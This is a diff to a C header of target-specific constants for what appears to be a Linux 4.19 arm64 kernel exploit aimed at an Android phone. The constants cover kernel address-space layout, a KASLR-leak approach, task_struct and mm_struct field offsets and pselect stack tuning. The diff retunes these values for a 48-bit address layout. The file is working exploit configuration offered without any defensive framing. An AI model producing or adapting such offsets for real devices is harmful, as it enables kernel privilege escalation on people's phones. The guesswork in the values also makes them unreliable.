@@ -26,14 +26,14 @@
 
 /* ---------------- address space ---------------- */
 #define KIMAGE_TEXT_BASE 0xffffff8008080000ULL          /* [A] kallsyms _text */
-#define P0_PAGE_OFFSET 0xffffff8000000000ULL            /* [A] 39-bit VA (CONFIG_ARM64_VA_BITS_39) */
+#define P0_PAGE_OFFSET 0xffff800000000000ULL            /* VA_BITS=47 candidate: ~0 - 2^47 + 1 */
 #define P0_PHYS_OFFSET 0x80000000ULL                    /* [D] qcom standard; verify /proc/iomem */
-#define P0_KERNEL_PHYS_LOAD 0x80080000ULL               /* [B] PHYS + Image text_offset 0x80000 */
-#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
-#define KERNELSNITCH_IDENTITY_END 0xffffffc000000000ULL /* [B] 16GB window (K40 6/8/12GB RAM) */
-#define DIRECT_MAP_BASE 0xffffff8000000000ULL
-#define DIRECT_MAP_END 0xffffffc000000000ULL            /* [B] 16GB */
-#define VMEMMAP_START 0xffffffbc00000000ULL             /* [B] 4.19 39-bit layout (NOT 6.x 0xfffffffe..) */
+#define P0_KERNEL_PHYS_LOAD 0x88080000ULL               /* [B] PHYS + Image text_offset 0x80000 */
+#define KERNELSNITCH_IDENTITY_START 0xffff7fe000000000ULL /* PAGE_OFFSET - 2GB (memstart rand margin) */
+#define KERNELSNITCH_IDENTITY_END 0xffff82a000000000ULL   /* +12GB window */
+#define DIRECT_MAP_BASE 0xffff7fe000000000ULL
+#define DIRECT_MAP_END 0xffff82a000000000ULL
+#define VMEMMAP_START 0xffff7bfc00000000ULL             /* 4.19 48-bit VA layout */
 
 #define PSELECT_WAITER_WORD_SHIFT 1                     /* [D] stack-frame tuning, confirm at runtime */
 
@@ -46,7 +46,7 @@
 #define ASHMEM_NAME_PREFIX_LEN 0   /* this kernel's ashmem has NO "/dev/ashmem" prefix (binary-verified) */
 #define ASHMEM_PREFIX_COUNT 0      /* 6.x prefix arithmetic disabled on 4.19 */
 /* on-device verified: mm_cachep object size == 0x340 (found via retry). */
-#define MM_STRUCT_SZ 0x340
+#define MM_STRUCT_SZ 8 /* fine scan: step over every 8B-aligned candidate */
 
 /* KASLR leak: direct /proc/kallsyms + dmesg are tried first (CFGOPS_4_19_STYLE
  * disables the boot_id rb-gadget, which needs per-build values and would panic
@@ -167,7 +167,7 @@
 #define TASK_PI_TOP_TASK_OFF 0x8d0
 #define TASK_PI_BLOCKED_ON_OFF 0x8d8
 
-#define MM_OWNER_OFF 0x310                              /* mm_struct.owner */
+#define MM_OWNER_OFF 0x328                              /* mm_struct.owner */
 #define TASK_PID_OFF 0x638
 #define TASK_TGID_OFF 0x63c
 #define TASK_REAL_PARENT_OFF 0x648
@@ -245,3 +245,11 @@
 #define FOPS_SHOW_FDINFO_OFF 0xd8
 
 #endif
+
+
+
+
+
+
+
+
